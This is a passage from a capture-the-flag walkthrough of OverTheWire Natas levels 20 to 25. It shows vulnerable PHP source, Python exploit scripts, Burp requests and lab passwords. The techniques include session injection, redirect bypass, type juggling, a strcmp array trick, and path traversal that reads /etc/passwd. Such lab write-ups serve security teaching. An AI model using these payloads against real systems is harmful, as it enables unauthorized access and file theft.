Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1619
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD 969hrbu40iem1f32c61essr8ev<br>DEBUG: Reading from /var/lib/php/sessions/mysess_969hrbu40iem1f32c61essr8ev<br>DEBUG: Read [name test
]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to test
admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
<form action="index.php" method="POST">
Your name: <input name="name" value="test
admin 1"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
DEBUG: MYWRITE 969hrbu40iem1f32c61essr8ev name|s:13:"test
admin 1";admin|s:1:"1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_969hrbu40iem1f32c61essr8ev<br>DEBUG: admin => 1<br>DEBUG: name => test
admin 1<br>
```

## Natas 21

### Credentials

Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
URL: http://natas21.natas.labs.overthewire.org

### Message

The first page:

**Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org**
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.

The second page:

**Note: this website is colocated with http://natas21.natas.labs.overthewire.org**

Example:
Hello world!

Change example values here:

align: center
fontsize: 100%
bgcolor: yellow

### Solution

We are given the source code for the first page:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "<censored>" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

<?php

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}


session_start();
print_credentials();

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

and for the second one:

```html
<html>
  <head>
    <link
      rel="stylesheet"
      type="text/css"
      href="http://natas.labs.overthewire.org/css/level.css"
    />
  </head>
  <body>
    <h1>natas21 - CSS style experimenter</h1>
    <div id="content">
      <p>
        <b
          >Note: this website is colocated with
          <a href="http://natas21.natas.labs.overthewire.org"
            >http://natas21.natas.labs.overthewire.org</a
          ></b
        >
      </p>
      <?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key =>
      $val) { $_SESSION[$key] = $val; } } if(array_key_exists("debug", $_GET)) {
      print "[DEBUG] Session contents:<br />"; print_r($_SESSION); } // only
      allow these keys $validkeys = array("align" => "center", "fontsize" =>
      "100%", "bgcolor" => "yellow"); $form = ""; $form .= '
      <form action="index.php" method="POST">
        '; foreach($validkeys as $key => $defval) { $val = $defval;
        if(array_key_exists($key, $_SESSION)) { $val = $_SESSION[$key]; } else {
        $_SESSION[$key] = $val; } $form .= "$key:
        <input name="$key" value="$val" /><br />"; } $form .= '<input
          type="submit"
          name="submit"
          value="Update"
        />'; $form .= '
      </form>
      '; $style = "background-color: ".$_SESSION["bgcolor"]."; text-align:
      ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";"; $example =
      "
      <div style="$style">Hello world!</div>
      "; ?>

      <p>Example:</p>
      <?=$example?>

      <p>Change example values here:</p>
      <?=$form?>

      <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
  </body>
</html>
```

The idea is quite simple: we see from the second page that we can set session variables. We are interested to set `admin = 1` and reuse it in the first page.

Thus we craft two requests, both with the same session ID; the first, directed to the second URL, sets `admin = 1` in the session; the second retrieves the credentials.

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

url1 = "http://natas21.natas.labs.overthewire.org/index.php"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1"


def send_request(url) -> str:
    cookie = "PHPSESSID=" + "admin"

    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    response = requests.get(url, headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url2 + "&submit=1&admin=1")
    print(text)
    text = send_request(url1)
    print(text)
```

This gives:

```bash
python natas21.py natas
<html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
[DEBUG] Session contents:<br>Array
(
    [debug] => 1
    [submit] => 1
    [admin] => 1
)

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 22

### Credentials

Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
URL: http://natas22.natas.labs.overthewire.org

### Message

There's just a blank page with a link to the source code.

### Solution

The source code:

```html
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This seems simple...

Though, the script

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas22', 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')

url = "http://natas22.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + "?revelio=1")
    print(text)
```

doesn't work as expected:

```bash
python natas22.py
Sending request to [http://natas22.natas.labs.overthewire.org/index.php?revelio=1]...


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Trying with Burp. The request:

```
GET /?revelio=1 HTTP/1.1
Host: natas22.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
Connection: keep-alive
Cookie: PHPSESSID=geosrhe1qijrg261strl2fgfat
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

passed to Repeater and sent, gives:

```
HTTP/1.1 302 Found
Date: Sun, 20 Oct 2024 14:52:57 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 23

### Credentials

Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
URL: http://natas23.natas.labs.overthewire.org

### Message

The page requires a password.

### Solution

We are given the source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This seems to verify that `iloveyou` is contained in the password; moreover, the password should be in some sense greater than `10`: `$_REQUEST["passwd"] > 10`. We can guess that some sort of casting is happening...

Let's try something like `1234iloveyou`:

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas23', 'dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs')

url = "http://natas23.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + "?passwd=1234iloveyou")
    print(text)
```

Easy job:

```bash
python natas23.py
Sending request to [http://natas23.natas.labs.overthewire.org/index.php?passwd=1234iloveyou]...
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 24

### Credentials

Username: natas24
Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
URL: http://natas24.natas.labs.overthewire.org

### Message

The page requests a password.

### Solution

We are given the source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Ok, first thought: we must brute-force. This is going to take like forever...

Hold on, think more. Read more about the function `strcmp`.

Interestingly, we find in [the documentation](https://www.php.net/manual/en/function.strcmp.php) for `strcmp`:

> If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
> For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.

Interestingly:

```
strcmp("foo", array()) => NULL + PHP Warning
```

The script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas24', 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd')

url = "http://natas24.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + f"?passwd[]=asd")
    print(text)
```

gives us:

```bash
$ python natas24.py
Sending request to [http://natas24.natas.labs.overthewire.org/index.php?passwd[]=asd]...
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 25

### Credentials

Username: natas25
Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
URL: http://natas25.natas.labs.overthewire.org

### Message

There is a quote:

> Quote
>
> You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.
> Scientist, Bad Boy Bubby

One can choose the language between English and German.

> Zitat
>
> Weißt du, niemand wird dir helfen Bubby. Denn es gibt Niemand, der dazu vorgesehen ist. Niemand. Wir sind alle nur komplizierte Anordnungen von Atomen und subatomaren Teilchen. Wir leben nicht. Unsere atome bewegen sich in einer Art und Weise, die uns Identität und Bewustesein verleiht. Wir sterben auch nicht. Unsere Atome strukturieren sich nur um. Es gibt keinen Gott, es kann keinen Gott geben. Es ist lächerlich, in Kategorien eines höheren Wesens zu denken. Eines niedrigeren Wesens, das könnte es vielleicht geben. Weil wir, die wir nicht mal existieren, unser Leben mit mehr Ordnung und Harmonie gestalten, als Gott jemals die Erde gestaltet hat. Wir essen, wir planen, wir erschaffen wunderbare Musik. Wir sind die Architekten unserer eigenen Existenz. Was für eine idiotische Vorstellung, sich vor einem Gott zu verneigen, der Millionen unschuldiger Kinder abschlachten lässt. Der für ihren langsamen und qualvollen Hungertod verantwortlich ist. Der zusieht, wie sie geschlagen und gefoltert werden. Der sie abweist. Welche Dummheit, auch nur zu denken, dass wir einen solchen Gott nicht beleidigen dürfen. Verdammt nochmal! Leugnen wir doch einfach seine Existenz. Es ist unsere Pflicht, die Existenz Gottes zu leugnen. Es ist unsere Pflicht, ihn zu beleidigen. Leck mich am Arsch, Gott! Schlag mich nieder, wenn du dich traust, du Tyrann! Du nicht existierender Betrug. Es ist die Pflicht aller menschlichen Wesen, die Existenz Gottes zu verneinen. Dann haben wir eine Zukunft. Denn dann, und nur dann, übernehmen wir die volle Verantwortung für das, was wir sind. Und genau das musst du tun, Bubby. Denk Gottes Existenz einfach weg. Übernimm die Verantwortung für das, was du bist.
> Wissenschaftler, Bad Boy Bubby

There is a link to the source code.

### Solution

The source code linked is:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php
    session_start();
    setLanguage();

    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP part:

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

The main page is `http://natas25.natas.labs.overthewire.org/`. Notice that setting the language as `de` redirects us to `http://natas25.natas.labs.overthewire.org/?lang=de`. Try the basic tampering method (that should fail according to the PHP code above): go to `http://natas25.natas.labs.overthewire.org/?lang=../`. This produces the error:

> Warning: include(/var/www/natas/natas25/language): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
>
> Warning: include(): Failed opening 'language/' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
>
> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
>
> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
>
> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82

We can try to bypass the `"../"` replacement with `""` requesting `http://natas25.natas.labs.overthewire.org/?lang=....//`.

> Warning: include(/var/www/natas/natas25): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
>
> Warning: include(): Failed opening 'language/../' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
>
> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
>
> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
>
> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82

Moreover, if we request `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//`:

> Warning: include(/var/www): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
>
> Warning: include(): Failed opening 'language/../../../' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
>
> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
>
> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
>
> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82

Let's try if this technique actually works with a file: `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd` correctly returns the `/etc/passwd` file!

Try with `....//....//....//....//..../etc/natas_webpass/natas26`: the request to `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//..../etc/natas_webpass/natas26` does not give any output. This was expected...

Looking better at the PHP code:

```php
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Here there is a `fopen` function call... We need to know our session ID. Looging at the cookies, we can easily get it: there is a cookie called `PHPSESSID`, which, for example has the value: `04mg3fhcld4h0i63i2b500cjgo`.

Request `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log` and get:

